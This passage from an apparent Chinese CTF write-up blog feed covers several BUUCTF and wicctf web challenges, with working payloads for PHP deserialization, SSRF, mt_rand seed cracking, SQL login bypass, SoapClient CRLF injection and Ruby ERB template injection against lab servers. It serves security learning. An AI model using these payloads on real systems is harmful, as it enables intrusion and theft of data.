</span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $weblogfile=<span class="hljs-string">&#x27;/flag&#x27;</span>;&#125;$a=<span class="hljs-keyword">new</span> weblog();<span class="hljs-keyword">echo</span> serialize($a);</code></pre></code></pre><p>payload：<code>?log=O:6:&quot;weblog&quot;:1:&#123;s:10:&quot;weblogfile&quot;;s:5:&quot;/flflagag&quot;;&#125;</code></p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/c6d9e931038e0740.png">      </p><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);    session_start();    $url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>] ?? <span class="hljs-literal">false</span>;    <span class="hljs-keyword">if</span>($url)    &#123;    $a = preg_match(<span class="hljs-string">&quot;/file|dict/i&quot;</span>, $url);        <span class="hljs-keyword">if</span> ($a==<span class="hljs-number">1</span>)        &#123;            <span class="hljs-keyword">exit</span>();        &#125;            $ch = curl_init();            curl_setopt($ch, CURLOPT_URL, $_GET[<span class="hljs-string">&quot;url&quot;</span>]);            curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);            curl_exec($ch);            curl_close($ch);    &#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>SSRF    </p><p><code>利用gopher协议攻击已知用户名无密码的Mysql</code>  </p><p>算了，环境也关了，附上<br><a href="https://mp.weixin.qq.com/s/j-M7gfVXdnxovWDiZGTihQ">宸极实验室的WP</a>    </p><p>还有一道GO语言的题…….完全不懂…..</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;UploadHub&quot;&gt;&lt;a href=&quot;#UploadHub&quot; class=&quot;headerlink&quot; title=&quot;UploadHub&quot;&gt;&lt;/a&gt;UploadHub&lt;/h2&gt;&lt;p&gt;文件上传题&lt;br&gt;给了源码，其中有些配置文件看不懂，放弃了   &lt;/p&gt;
&lt;p&gt;&lt;i</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="wicctf" scheme="http://lll-nnn.github.io/categories/CTF/wicctf/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="wicctf" scheme="http://lll-nnn.github.io/tags/wicctf/"/>
    
  </entry>
  
  <entry>
    <title>StrongestMind</title>
    <link href="http://lll-nnn.github.io/2021/05/10/BUU85/"/>
    <id>http://lll-nnn.github.io/2021/05/10/BUU85/</id>
    <published>2021-05-10T15:19:37.000Z</published>
    <updated>2021-05-10T15:41:06.352Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PY"><a href="#PY" class="headerlink" title="PY"></a>PY</h2><p>打开环境 </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/0d2f6b843629e1dc.png"></p><p>python脚本      </p><p>还不会写，研究下大佬的      </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">count</span>():</span>    s = requests.session()       <span class="hljs-comment">#会话保持</span>    url = <span class="hljs-string">&#x27;http://ee15b87d-2094-4459-97e9-6c7d3f88800d.node3.buuoj.cn/&#x27;</span>    match = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;[0-9]+ [+|-] [0-9]+&quot;</span>)  <span class="hljs-comment">#正则匹配   +：匹配前面的表达式一次或多次</span>    r = s.get(url)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1001</span>):        sleep(<span class="hljs-number">0.1</span>)        <span class="hljs-built_in">str</span> = match.findall(r.text)[<span class="hljs-number">0</span>]        print(<span class="hljs-built_in">str</span>)        <span class="hljs-comment"># print(eval(str))</span>        data = &#123;<span class="hljs-string">&quot;answer&quot;</span> : <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>)&#125;   <span class="hljs-comment">#eval执行</span>        r = s.post(url, data=data)        r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span>        print(<span class="hljs-string">&#x27;&#123;&#125; : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>)))        <span class="hljs-comment"># print(r.text)</span>    print(r.text)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    count()</code></pre></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PY&quot;&gt;&lt;a href=&quot;#PY&quot; class=&quot;headerlink&quot; title=&quot;PY&quot;&gt;&lt;/a&gt;PY&lt;/h2&gt;&lt;p&gt;打开环境 &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ftp.bmp.ovh/imgs/2021/05/0d2f6b843629e1</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="python" scheme="http://lll-nnn.github.io/categories/CTF/python/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="python" scheme="http://lll-nnn.github.io/tags/python/"/>
    
    <category term="exp" scheme="http://lll-nnn.github.io/tags/exp/"/>
    
  </entry>
  
  <entry>
    <title>Ezaudit</title>
    <link href="http://lll-nnn.github.io/2021/05/08/BUU84/"/>
    <id>http://lll-nnn.github.io/2021/05/08/BUU84/</id>
    <published>2021-05-08T10:07:27.000Z</published>
    <updated>2021-05-08T10:34:07.554Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0"><a href="#0" class="headerlink" title="-0-)"></a>-0-)</h2><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/e304316d-4424-4850-b53e-7392e0c5c05e.png" alt="01.png">     </p><p>题目打开是这样，挺正经的，以为是什么漏洞，源码中也没有提示     </p><p>看一眼题目名<code>Ezaudit</code>简单的审计     </p><p>哦   </p><p><code>www.zip</code>  </p><p>果然   </p><p>下载下来是<code>index.php</code>     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> header(<span class="hljs-string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;login&#x27;</span>]))&#123;    $username = $_POST[<span class="hljs-string">&#x27;username&#x27;</span>];    $password = $_POST[<span class="hljs-string">&#x27;password&#x27;</span>];    $Private_key = $_POST[<span class="hljs-string">&#x27;Private_key&#x27;</span>];    <span class="hljs-keyword">if</span> (($username == <span class="hljs-string">&#x27;&#x27;</span>) || ($password == <span class="hljs-string">&#x27;&#x27;</span>) ||($Private_key == <span class="hljs-string">&#x27;&#x27;</span>)) &#123;        <span class="hljs-comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;        <span class="hljs-keyword">exit</span>;&#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($Private_key != <span class="hljs-string">&#x27;*************&#x27;</span> )    &#123;        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;        <span class="hljs-keyword">exit</span>;    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">if</span>($Private_key === <span class="hljs-string">&#x27;************&#x27;</span>)&#123;        $getuser = <span class="hljs-string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>.<span class="hljs-string">&#x27;;&#x27;</span>;         $link=mysql_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);        mysql_select_db(<span class="hljs-string">&quot;test&quot;</span>,$link);        $result = mysql_query($getuser);        <span class="hljs-keyword">while</span>($row=mysql_fetch_assoc($result))&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="hljs-string">&quot;flag&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;        &#125;    &#125;    &#125;&#125; <span class="hljs-comment">// genarate public_key </span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params">$length = <span class="hljs-number">16</span></span>) </span>&#123;    $strings1 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $public_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $length; $i++ )    $public_key .= substr($strings1, mt_rand(<span class="hljs-number">0</span>, strlen($strings1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $public_key;  &#125;  <span class="hljs-comment">//genarate private_key</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params">$length = <span class="hljs-number">12</span></span>) </span>&#123;    $strings2 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $private_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ( $i = <span class="hljs-number">0</span>; $i &lt; $length; $i++ )    $private_key .= substr($strings2, mt_rand(<span class="hljs-number">0</span>, strlen($strings2) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $private_key;  &#125;  $Public_key = public_key();  <span class="hljs-comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></code></pre></code></pre><p>首先要获取到<code>private_key</code>    </p><p>之前也做过一道<code>mt_rand</code>的题目，那一道是根据前几位得到<code>seed</code>      </p><p>这次用<code>public_key</code>得到<code>seed</code>这两个应该是同一个<code>seed</code>吧   </p><p>不过这次用之前的脚本转换时爆不出来     </p><p>找了一个新的脚本     </p><p>发现少了一位，我之前那道题是怎么做出来的！！！？？？   </p><p>PHP版：     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$pass=<span class="hljs-string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span>;$str=<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;$result=<span class="hljs-string">&#x27;&#x27;</span>;$len1=strlen($pass);$len2=strlen($str)<span class="hljs-number">-1</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;$len1;$i++)&#123;    <span class="hljs-keyword">for</span>($j=<span class="hljs-number">0</span>;$j&lt;$len2+<span class="hljs-number">1</span>;$j++)    &#123;        <span class="hljs-keyword">if</span>($pass[$i]===$str[$j])        &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$j</span> <span class="hljs-subst">$j</span> 0 <span class="hljs-subst">$len2</span> &quot;</span>;            <span class="hljs-keyword">break</span>;        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>python版：    </p><pre><code><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span>s = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>key = <span class="hljs-string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span>m = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key:    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):        <span class="hljs-keyword">if</span> i == s[j]:            m += <span class="hljs-string">&quot;&#123;&#125; &#123;&#125; 0 &#123;&#125; &quot;</span>.<span class="hljs-built_in">format</span>(j,j,<span class="hljs-built_in">len</span>(s)<span class="hljs-number">-1</span>)print(m)</code></pre></code></pre><p>转换后的结果：      </p><pre><code>36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61      </code></pre><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/bd326a1b-2d71-4537-b51c-fdfe509f1aaa.png" alt="02.png">      </p><p>注意这里的PHP版本为<code>5.2.1 to 7.0.x</code>如果版本不对的话，生成的也不一样。</p><p>重新生成<code>private_key</code>        </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>mt_srand(<span class="hljs-number">1775196155</span>);<span class="hljs-comment">// genarate public_key </span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">public_key</span>(<span class="hljs-params">$length = <span class="hljs-number">16</span></span>)</span><span class="hljs-function"></span>&#123;    $strings1 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $public_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; $length; $i++)        $public_key .= substr($strings1, mt_rand(<span class="hljs-number">0</span>, strlen($strings1) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $public_key;&#125;<span class="hljs-comment">//genarate private_key</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">private_key</span>(<span class="hljs-params">$length = <span class="hljs-number">12</span></span>)</span><span class="hljs-function"></span>&#123;    $strings2 = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;    $private_key = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; $length; $i++)        $private_key .= substr($strings2, mt_rand(<span class="hljs-number">0</span>, strlen($strings2) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);    <span class="hljs-keyword">return</span> $private_key;&#125;<span class="hljs-keyword">echo</span> public_key().<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> private_key();</code></pre></code></pre><p>得到：     </p><pre><code>KVQP0LdJKRaV3n9DXuNhoueCDCGc   </code></pre><p>sql万能公式得到flag：     </p><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/654d7ca9-db67-400a-b992-0afefb8809be.png" alt="03.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0&quot;&gt;&lt;a href=&quot;#0&quot; class=&quot;headerlink&quot; title=&quot;-0-)&quot;&gt;&lt;/a&gt;-0-)&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.c</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="mt_srand" scheme="http://lll-nnn.github.io/tags/mt-srand/"/>
    
  </entry>
  
  <entry>
    <title>Bestphp&#39;s Revenge</title>
    <link href="http://lll-nnn.github.io/2021/05/06/BUU83/"/>
    <id>http://lll-nnn.github.io/2021/05/06/BUU83/</id>
    <published>2021-05-06T15:28:04.000Z</published>
    <updated>2021-05-07T15:34:01.583Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Knowledge"><a href="#Knowledge" class="headerlink" title="Knowledge"></a>Knowledge</h2><ul><li>PHP中SESSION反序列化   <ul><li>PHP中的session中的内容是以文件的方式存储的，并不是存于内存中，存储方式由配置项<code>session.save_handler</code>控制，默认文件。</li><li>文件以sess_sessionid进行命名，文件的内容是session值序列化后的内容</li><li>在<code>php.ini</code>中存在三项配置：</li><li><code>session.save_path=&quot;&quot;</code>   –设置session的存储路径     </li><li><code>session.save_handler=&quot;&quot; </code>–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)       </li><li><code>session.serialize_handler   string</code> –定义用来序列化/反序列化的处理器名字。默认是php(5.5.4后改为php_serialize)    </li><li><code>session.serialize_handler</code>存在三种模式   </li><li><code>php_binary</code>—&gt;键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</li><li><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/e340b98b-eff6-43b5-b50a-ab8ee414d4f3.png" alt="03.png">        </li><li><code>php</code>—-&gt;键名+竖线（|）+经过serialize()函数处理过的值</li><li><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/011a6f2d-5c94-46fc-ba17-8758eeb94a48.png" alt="04.png">       </li><li><code>php_serialize</code>—-&gt;经过serialize()函数处理过的值，会将键名和值当作一个数组序列化   </li><li><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/d4410c44-8d12-4db3-a1cc-8502eeb791d0.png" alt="05.png">   </li><li>如果能够改变序列化的模式，比如默认是PHP，将其改为<code>php_serialize</code>，出入序列化前面加上<code>|</code>，这样反序列化时，按默认的<code>php</code>时，传入的序列化就被反序列化了      </li></ul></li></ul><ul><li><p>PHP原生类<code>SoapClient</code>，当其中的<code>__call</code>方法触发时可以发送HTTP和HTTPs请求</p><ul><li><code>public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）</code>      </li><li>第一个参数指明是否为<code>wsdl模式</code>     </li><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。   </li><li><a href="https://www.anquanke.com/post/id/153065#h2-1">soap</a>    </li></ul></li><li><p><a href="https://www.jianshu.com/p/d4c304dbd0af"><code>CRLF Injection</code></a>       </p><ul><li>简单说就是在请求头中注入<code>\r\n</code>,从而生成新的请求头，或者覆盖原来的请求头，或者注入<code>\r\n\r\n</code>,注入请求（头和体由两个<code>\r\n</code>分割）     </li></ul></li></ul><h2 id="Try-To-Solve"><a href="#Try-To-Solve" class="headerlink" title="Try To Solve"></a>Try To Solve</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);$b = <span class="hljs-string">&#x27;implode&#x27;</span>;call_user_func($_GET[<span class="hljs-string">&#x27;f&#x27;</span>], $_POST);session_start();<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;    $_SESSION[<span class="hljs-string">&#x27;name&#x27;</span>] = $_GET[<span class="hljs-string">&#x27;name&#x27;</span>];&#125;var_dump($_SESSION);$a = <span class="hljs-keyword">array</span>(reset($_SESSION), <span class="hljs-string">&#x27;welcome_to_the_lctf2018&#x27;</span>);call_user_func($b, $a);<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>一开始，直接一个<code>$_POST</code>没反应过来<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/6b2ec884-06ae-4190-b0fd-89028778c220.png" alt="02.png"></p><p>发现<code>flag.php</code>      </p><pre><code><pre><code class="hljs php">only localhost can get flag!session_start();<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;only localhost can get flag!&#x27;</span>;$flag = <span class="hljs-string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;<span class="hljs-keyword">if</span>($_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]===<span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;       $_SESSION[<span class="hljs-string">&#x27;flag&#x27;</span>] = $flag;   &#125;only localhost can get flag!</code></pre></code></pre><p>解题思路：首先可以通过第一个<code>call_user_func</code>覆盖<code>serialize_handler</code>为<code>php_serialize</code>，在name中写入利用<code>soapClient</code>产生的序列化；第二次通过<code>extract</code>覆盖变量<code>b</code>为<code>call_user_func</code>，name为<code>SoapClient</code>，当<code>call_user_func</code>的参数为一个数组时，会把键名当作一个类名，值当作方法；</p><p><code>call_user_func($b, $a);</code>——&gt;<code>call_user_func(call_user_func(array(SoapClient,&#39;welcome_to_the_lctf2018&#39;)))</code>——&gt;<code>SoapClient-&gt;welcome_to_the_lctf2018()</code>—–&gt;没有这个方法，从而调用<code>__call</code>       </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$target = <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>;$attack = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; $target,    <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;N0rth3ty\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n&quot;</span>,    <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;123&quot;</span>));$payload = urlencode(serialize($attack));<span class="hljs-keyword">echo</span> $payload;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>第一次使用SoapClient类会报错，需要在<code>php.ini</code>中打开<br><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/3910e692-bdd4-40f7-b076-82fa36305fac.png" alt="01.png"></p><p>传入 </p><pre><code>f=session_start&amp;name=[生成的payload]         POST: serializer_handler=php_serialize</code></pre><p>然后传</p><pre><code>f=extract&amp;name=SoapClienPOST:b=call_user_func   </code></pre><p>来触发类    </p><p>但我这里没成功，试了好几个师傅的都不行        </p><p>算了    </p><p>就当积累知识点吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Knowledge&quot;&gt;&lt;a href=&quot;#Knowledge&quot; class=&quot;headerlink&quot; title=&quot;Knowledge&quot;&gt;&lt;/a&gt;Knowledge&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;PHP中SESSION反序列化   &lt;ul&gt;
&lt;li&gt;PHP中的sess</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="serialize" scheme="http://lll-nnn.github.io/tags/serialize/"/>
    
    <category term="原生类" scheme="http://lll-nnn.github.io/tags/%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>Flag Shop</title>
    <link href="http://lll-nnn.github.io/2021/05/04/BUU82/"/>
    <id>http://lll-nnn.github.io/2021/05/04/BUU82/</id>
    <published>2021-05-04T13:29:59.000Z</published>
    <updated>2021-05-04T14:27:04.355Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="|_|-|"></a>|_|-|</h2><p>打开环境</p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/172950/8/7918/21544/60915946Edcb47200/b52ca327067e551d.png" alt="01.png"></p><p>点一下<code>buy flag</code>     </p><p>弹出了<code>&#123;&quot;title&quot;:&quot;error&quot;,&quot;message&quot;:&quot;no enough jkl&quot;&#125;</code>     </p><p>想到了应该是要伪造cookie     </p><p>顺便看看<code>robots.txt</code>，居然有    </p><pre><code>User-agent: *Disallow: /filebak     </code></pre><p><code>/filebak</code>     </p><pre><code>```rubyrequire &#39;sinatra&#39;require &#39;sinatra/cookies&#39;require &#39;sinatra/json&#39;require &#39;jwt&#39;require &#39;securerandom&#39;require &#39;erb&#39;set :public_folder, File.dirname(__FILE__) + &#39;/static&#39;FLAGPRICE = 1000000000000000000000000000ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)configure do  enable :logging  file = File.new(File.dirname(__FILE__) + &#39;/../log/http.log&#39;,&quot;a+&quot;)  file.sync = true  use Rack::CommonLogger, fileendget &quot;/&quot; do  redirect &#39;/shop&#39;, 302endget &quot;/filebak&quot; do  content_type :text  erb IO.binread __FILE__endget &quot;/api/auth&quot; do  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;  cookies[:auth] = authendget &quot;/api/info&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)endget &quot;/shop&quot; do  erb :shopendget &quot;/work&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  auth = auth[0]  unless params[:SECRET].nil?    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)      puts ENV[&quot;FLAG&quot;]    end  end  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result  endendpost &quot;/shop&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)  else    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)  endenddef islogin  if cookies[:auth].nil? then    redirect to(&#39;/shop&#39;)  endend```   </code></pre><p>虽然看不懂是啥，但看到了jwt     </p><p>cookie应该就是jwt了吧     </p><p>解码一下     </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/181071/5/2256/71195/60915948Eaa5fb2dd/e6380093c94ee610.png" alt="02.png">   </p><p>确实，试着用<code>jwtcrack</code>爆破一下secret      </p><p>爆了一会，感觉爆不出来    </p><p>难道不是这个考点    </p><p>回去看那个源码    </p><p>看不懂     </p><p>还是去看WP吧   </p><hr><p>ruby的ERB模板注入     </p><p>主要的代码    </p><pre><code>```rubyget &quot;/work&quot; do  islogin  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;  auth = auth[0]  unless params[:SECRET].nil?    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)      puts ENV[&quot;FLAG&quot;]    end  end  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;    cookies[:auth] = auth    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;&quot;).result  endend```      </code></pre><p>参数<code>SECRET</code>与真的<code>SECRET</code>匹配，成功则返回flag    </p><p>参数<code>do</code>与<code>name</code>，如果do的值与name的前七位加上<code> is working</code>一样，会弹出<code>&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;/script&gt;</code><br>这里存在模板注入</p><p>REB模板注入的格式<code>&lt;%=7*7%&gt;</code>——-&gt;49      </p><p>然后是ruby中的<a href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html">预定义变量</a>–&gt;<code>$&#39;</code>返回最后一次成功匹配右边的字符串      </p><p>最后一次成功匹配？？？上面那个？？</p><p>构造<code>&lt;%=$&#39;%&gt;</code>正好七位     </p><p>还要hex编码，不知道为什么。。。。。。。       </p><p>payload：<code>/work?SECRET=&amp;name=%3C%25%3D%24%27%25%3E&amp;do=%3C%25%3D%24%27%25%3E%20is%20working</code>     </p><p><img 